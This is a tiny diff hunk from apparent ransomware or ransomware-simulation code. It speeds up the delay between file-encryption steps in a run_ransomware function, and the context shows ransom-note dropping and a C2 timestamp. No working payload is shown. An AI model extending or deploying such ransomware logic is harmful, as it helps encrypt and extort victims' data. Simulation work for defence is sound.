@@ -125,7 +125,7 @@ def run_ransomware(
             f"{encrypted_count} files encrypted. Latest item: {locked_path.relative_to(base_dir)}",
             event_log["last_encrypted_at"],
         )
-        time.sleep(1.5)
+        time.sleep(0.5)
 
     _drop_ransom_notes(target_path)
     c2_time = time.time()
